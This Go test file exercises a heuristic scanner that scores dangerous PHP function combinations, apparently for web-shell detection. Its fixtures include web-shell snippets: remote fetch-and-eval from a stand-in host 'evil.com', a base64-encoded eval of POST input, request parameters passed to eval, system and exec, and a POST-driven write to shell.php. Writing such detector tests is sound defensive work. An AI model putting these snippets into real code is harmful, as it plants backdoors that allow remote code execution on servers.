package heuristic

import (
	"testing"
)

func TestNewCombinationAnalyzer(t *testing.T) {
	ca := NewCombinationAnalyzer()

	if ca == nil {
		t.Fatal("NewCombinationAnalyzer returned nil")
	}

	if ca.patterns == nil {
		t.Fatal("patterns map should be initialized")
	}

	// Check that key patterns are compiled
	expectedPatterns := []string{
		"eval", "exec", "system", "base64_decode",
		"$_GET", "$_POST", "$_REQUEST",
	}

	for _, p := range expectedPatterns {
		if _, ok := ca.patterns[p]; !ok {
			t.Errorf("Expected pattern %q to be compiled", p)
		}
	}
}

func TestCombinationAnalyzer_Analyze(t *testing.T) {
	ca := NewCombinationAnalyzer()

	tests := []struct {
		name          string
		input         string
		wantMatches   int
		wantCombos    []string // Expected combination names
		wantSeverity  string   // Expected highest severity
	}{
		{
			name:         "clean code - no matches",
			input:        `<?php echo "Hello World"; ?>`,
			wantMatches:  0,
			wantCombos:   nil,
			wantSeverity: "",
		},
		{
			name: "eval only - no combination",
			input: `<?php
				eval("echo 1;");
			?>`,
			wantMatches:  0,
			wantCombos:   nil,
			wantSeverity: "",
		},
		{
			name: "file_get_contents + eval - RCE",
			input: `<?php
				$code = file_get_contents("http://evil.com/shell.php");
				eval($code);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"Remote Code Execution"},
			wantSeverity: "critical",
		},
		{
			name: "base64_decode + eval - common obfuscation",
			input: `<?php
				$payload = base64_decode("ZXZhbCgkX1BPU1RbJ2NtZCddKTs=");
				eval($payload);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"Base64 Execution"},
			wantSeverity: "high",
		},
		{
			name: "$_GET + eval - user input execution",
			input: `<?php
				$cmd = $_GET['cmd'];
				eval($cmd);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"User Input Execution"},
			wantSeverity: "critical",
		},
		{
			name: "$_POST + eval - POST data execution",
			input: `<?php
				$data = $_POST['data'];
				eval($data);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"POST Data Execution"},
			wantSeverity: "critical",
		},
		{
			name: "$_GET + system - command injection",
			input: `<?php
				$cmd = $_GET['cmd'];
				system($cmd);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"User Input System Call"},
			wantSeverity: "critical",
		},
		{
			name: "curl_exec + eval - remote code",
			input: `<?php
				$ch = curl_init("http://evil.com");
				$data = curl_exec($ch);
				eval($data);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"Curl Code Execution"},
			wantSeverity: "critical",
		},
		{
			name: "gzinflate + eval - compressed payload",
			input: `<?php
				$code = gzinflate(base64_decode($encoded));
				eval($code);
			?>`,
			wantMatches:  2, // gzinflate+eval AND base64+eval
			wantSeverity: "high",
		},
		{
			name: "$_POST + file_put_contents - file write from input",
			input: `<?php
				$content = $_POST['content'];
				file_put_contents("shell.php", $content);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"File Write from Input"},
			wantSeverity: "high",
		},
		{
			name: "create_function + call_user_func - dynamic function",
			input: `<?php
				$func = create_function('$a', 'return $a;');
				call_user_func($func, "test");
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"Dynamic Function Call"},
			wantSeverity: "high",
		},
		{
			name: "$_REQUEST + exec - request execution",
			input: `<?php
				$cmd = $_REQUEST['cmd'];
				exec($cmd);
			?>`,
			wantMatches:  1,
			wantCombos:   []string{"Request Execution"},
			wantSeverity: "critical",
		},
		{
			name: "multiple dangerous combinations",
			input: `<?php
				$cmd = $_GET['cmd'];
				eval($cmd);
				system($cmd);
				$data = file_get_contents("http://evil.com");
				eval($data);
			?>`,
			wantMatches: 3, // GET+eval, GET+system, file_get_contents+eval
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matches := ca.Analyze(tt.input)

			if len(matches) != tt.wantMatches {
				t.Errorf("Analyze() returned %d matches, want %d", len(matches), tt.wantMatches)
				for _, m := range matches {
					t.Logf("  Found: %s (severity: %s)", m.Combination.Name, m.Combination.Severity)
				}
			}

			if tt.wantCombos != nil {
				for _, wantName := range tt.wantCombos {
					found := false
					for _, m := range matches {
						if m.Combination.Name == wantName {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected to find combination %q", wantName)
					}
				}
			}

			if tt.wantSeverity != "" && len(matches) > 0 {
				// Check highest severity
				severities := map[string]int{
					"critical": 4,
					"high":     3,
					"medium":   2,
					"low":      1,
				}
				maxSeverity := ""
				maxLevel := 0
				for _, m := range matches {
					if severities[m.Combination.Severity] > maxLevel {
						maxLevel = severities[m.Combination.Severity]
						maxSeverity = m.Combination.Severity
					}
				}
				if maxSeverity != tt.wantSeverity {
					t.Errorf("Highest severity = %q, want %q", maxSeverity, tt.wantSeverity)
				}
			}
		})
	}
}

func TestCombinationAnalyzer_Positions(t *testing.T) {
	ca := NewCombinationAnalyzer()

	input := `<?php
$data = $_GET['x'];
eval($data);
?>`

	matches := ca.Analyze(input)

	if len(matches) == 0 {
		t.Fatal("Expected at least one match")
	}

	match := matches[0]

	// Check that positions are tracked
	if len(match.Positions) == 0 {
		t.Error("Positions should be populated")
	}

	// Check that found functions are tracked
	if len(match.FoundFuncs) < 2 {
		t.Errorf("Expected at least 2 found functions, got %d", len(match.FoundFuncs))
	}
}

func TestGetHighestScore(t *testing.T) {
	tests := []struct {
		name    string
		matches []CombinationMatch
		want    int
	}{
		{
			name:    "empty matches",
			matches: nil,
			want:    0,
		},
		{
			name: "single match",
			matches: []CombinationMatch{
				{Combination: SuspiciousCombination{Score: 75}},
			},
			want: 75,
		},
		{
			name: "multiple matches",
			matches: []CombinationMatch{
				{Combination: SuspiciousCombination{Score: 50}},
				{Combination: SuspiciousCombination{Score: 100}},
				{Combination: SuspiciousCombination{Score: 75}},
			},
			want: 100,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := GetHighestScore(tt.matches)
			if result != tt.want {
				t.Errorf("GetHighestScore() = %d, want %d", result, tt.want)
			}
		})
	}
}

func TestGetCriticalMatches(t *testing.T) {
	tests := []struct {
		name    string
		matches []CombinationMatch
		want    int
	}{
		{
			name:    "empty matches",
			matches: nil,
			want:    0,
		},
		{
			name: "no critical matches",
			matches: []CombinationMatch{
				{Combination: SuspiciousCombination{Severity: "high"}},
				{Combination: SuspiciousCombination{Severity: "medium"}},
			},
			want: 0,
		},
		{
			name: "mixed severities",
			matches: []CombinationMatch{
				{Combination: SuspiciousCombination{Severity: "critical"}},
				{Combination: SuspiciousCombination{Severity: "high"}},
				{Combination: SuspiciousCombination{Severity: "critical"}},
			},
			want: 2,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := GetCriticalMatches(tt.matches)
			if len(result) != tt.want {
				t.Errorf("GetCriticalMatches() returned %d matches, want %d", len(result), tt.want)
			}
		})
	}
}

func TestSuspiciousCombinations_Coverage(t *testing.T) {
	// Ensure all predefined combinations have required fields
	for i, combo := range suspiciousCombinations {
		if combo.Name == "" {
			t.Errorf("Combination %d has empty Name", i)
		}
		if combo.Description == "" {
			t.Errorf("Combination %d (%s) has empty Description", i, combo.Name)
		}
		if len(combo.Functions) < 2 {
			t.Errorf("Combination %d (%s) has less than 2 functions", i, combo.Name)
		}
		if combo.Severity == "" {
			t.Errorf("Combination %d (%s) has empty Severity", i, combo.Name)
		}
		if combo.Score < 1 || combo.Score > 100 {
			t.Errorf("Combination %d (%s) has invalid Score: %d", i, combo.Name, combo.Score)
		}

		// Check severity is valid
		validSeverities := map[string]bool{
			"critical": true,
			"high":     true,
			"medium":   true,
			"low":      true,
		}
		if !validSeverities[combo.Severity] {
			t.Errorf("Combination %d (%s) has invalid Severity: %s", i, combo.Name, combo.Severity)
		}
	}
}

func TestCombinationAnalyzer_CaseInsensitive(t *testing.T) {
	ca := NewCombinationAnalyzer()

	// Test that function detection is case-insensitive
	inputs := []string{
		`<?php EVAL($_GET['x']); ?>`,
		`<?php Eval($_GET['x']); ?>`,
		`<?php eVaL($_GET['x']); ?>`,
	}

	for _, input := range inputs {
		matches := ca.Analyze(input)
		if len(matches) == 0 {
			t.Errorf("Expected match for input %q (case-insensitive)", input)
		}
	}
}

func TestCombinationAnalyzer_SuperglobalVariants(t *testing.T) {
	ca := NewCombinationAnalyzer()

	// Test superglobals that have defined combinations with eval
	tests := []struct {
		superglobal string
		dangerous   string
		shouldMatch bool
	}{
		{"$_GET", "eval", true},       // User Input Execution
		{"$_POST", "eval", true},      // POST Data Execution
		{"$_GET", "system", true},     // User Input System Call
		{"$_REQUEST", "exec", true},   // Request Execution
		{"$_POST", "file_put_contents", true}, // File Write from Input
	}

	for _, tt := range tests {
		name := tt.superglobal + " + " + tt.dangerous
		t.Run(name, func(t *testing.T) {
			input := `<?php $x = ` + tt.superglobal + `['cmd']; ` + tt.dangerous + `($x); ?>`
			matches := ca.Analyze(input)

			hasMatch := len(matches) > 0
			if hasMatch != tt.shouldMatch {
				t.Errorf("Expected match=%v for %s + %s, got %v",
					tt.shouldMatch, tt.superglobal, tt.dangerous, hasMatch)
			}
		})
	}
}

// Benchmarks

func BenchmarkCombinationAnalyzer_Analyze(b *testing.B) {
	ca := NewCombinationAnalyzer()
	input := `<?php
		$cmd = $_GET['cmd'];
		$data = base64_decode($encoded);
		eval($data);
		system($cmd);
	?>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ca.Analyze(input)
	}
}

func BenchmarkCombinationAnalyzer_CleanCode(b *testing.B) {
	ca := NewCombinationAnalyzer()
	input := `<?php
		function greet($name) {
			echo "Hello, " . htmlspecialchars($name);
		}
		greet($_GET['name']);
	?>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ca.Analyze(input)
	}
}
